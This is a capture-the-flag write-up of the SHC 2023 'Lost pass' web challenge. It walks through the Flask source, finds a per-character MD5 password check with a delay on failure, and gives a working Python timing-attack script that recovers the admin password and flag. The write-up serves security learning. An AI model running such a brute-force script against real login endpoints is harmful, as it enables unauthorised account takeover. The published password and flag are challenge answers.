### Intro
Swiss hacking challenge is a swiss national CTF, made to select the best hackers for ECSC and other competitions. Although I am not swiss,
I wanted to know more about the /mnt/41n team, the friendly rivalry with France ( it seems to run many years back in ECSC circuit) and memes.

# SHC 2023 - Lost pass (WEB) 

## Description

Looks like somebody lost his password.

We are given website [source code](https://github.com/eqqn/eqqn.github.io/blob/master/uploads/lost_pass.zip) for the website. It's a python Flask application.

### Looking around
The frontend presents you a login form. The `register` buttons do not submit any data and we get HTTP 405 - Method not allowed. 
The /register API is defined in the source code provided, and I could register as a user, and receive a JWT token to toy with.

` curl -X POST hxxp://chall.m0unt41n.ch:31063/register -d 'username=USER&password=PASS' `

### Code analysis

There is a lot going on in this code, I was jumping around and doing all the wrong things initially. 

The goal is to login to the page as admin, as the template will render the flag, if you are logged in as admin.
``` python
    if user["username"] == "admin":
        return render_template('dashboard.html', message=f"Your secret is: {open('flag.txt', 'r').read()}")
    return render_template('dashboard.html', message=f"lettuce")
```



``` python
sys.set_int_max_str_digits(0)
app.config['SECRET_KEY'] = secrets.token_hex(20)
```
*set_int_max_str_digits(0)* did not run initially, needing python3.11. I commented it out and tried to run it locally, 
TLDR - its a DOS mitigation[1],[2], setting it at 0 does not affect integer calc and actually disables it. No relevance in integer(crypto?) operations.

The secret is generated on startup securely and hashcat will not even let you do a 16^20 search.

There are also some SQL queries done, but no luck there.
``` python
def error_log(username, password):
    if username == "admin":
        f = open("error.log", "w")
        time.sleep(1)  #this is kind of interesting...
        f.write(f"SOMEONE TRIED TO LOGIN AS ADMIN USING {password} !!!1!11!!")
        f.close()
    return False
```
This initially looked interesting, if we could inject into {password} variable. We can, but python f strings are solid enough. 
I got the application to run locally and tried passing python commands as password, but no luck. We will use the `time.sleep(1)` later!

``` python
@app.route('/dashboard', methods=['GET'])
@auth_required
def dashboard(token):
    user = db.getUserbyId(token["id"])
    if user["username"] == "admin":
        return render_template('dashboard.html', message=f"Your secret is: {open('flag.txt', 'r').read()}")
    return render_template('dashboard.html', message=f"lettuce")
```
the `user["username"] == "admin"` comparison is solid, creating "weird" usernames like `admin\n` or `admin[]` did not pass.

### The vulnerability
Perhaps obvious, but the password generation has a flaw (besides using md5)- it compares the hash of **each character** rather than the whole string... 
``` python
def check_password(username, hashed_password, password):
    hashed_password = hashed_password.split(",")
    for x in range(len(hashed_password)):
        try:
            if hash_char(password[x]) != hashed_password[x]:
                return error_log(username, password)
        except:
            return False
    return True
  
def hash_char(char):
    return hashlib.md5(char.encode()).hexdigest()[:20]
```
This opens the doors for a Timing Attack.  To confirm the theory, I tried comparing times of the first letter of the pass. 
I observed that with the first password character "d", the response time was short. If we did not provide another wrong character, 
then error ( and 1 second sleep!) is never performed. 

I wrote a script, tested locally, and I was able to recover my dummy secret. 

``` python
import requests
import time

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'keep-alive'
}
charlist='1234567890abcdefghijklmnopqrstuvwxyz'
data = {'username': 'admin','password': 'a'}

def tracer(text):
    data = {'username': 'admin','password': text}
    start_time=time.time()
    response = requests.post('http://chall.m0unt41nD3w.ch:30902/login', headers=headers, data=data)
    duration=time.time() - start_time
    print( "%s--- %s seconds" %(text, duration))
    return duration

i=0
password=''
while True:
    letter=charlist[i]
    attempt=password+letter
    duration=tracer(attempt)
    i=i+1
    if duration <1: #good outcome
        time.sleep(0.1)
        duration=tracer(attempt)
        if duration < 1:
            password=attempt
            i=0
    time.sleep(0.1)
```
![Password recovery](https://eqqn.github.io/images/shc_lp_ducksnice.png)


I unleashed it on the challenge website and recovered the password for admin :
`ducksnice`

![flag](https://eqqn.github.io/images/shc_lp_flag.png)
Login and get the flag! 
shc{ducks_like_2_sleep_quack}

[1]https://github.com/python/cpython/issues/95778
[2]https://python-forum.io/thread-38185.html
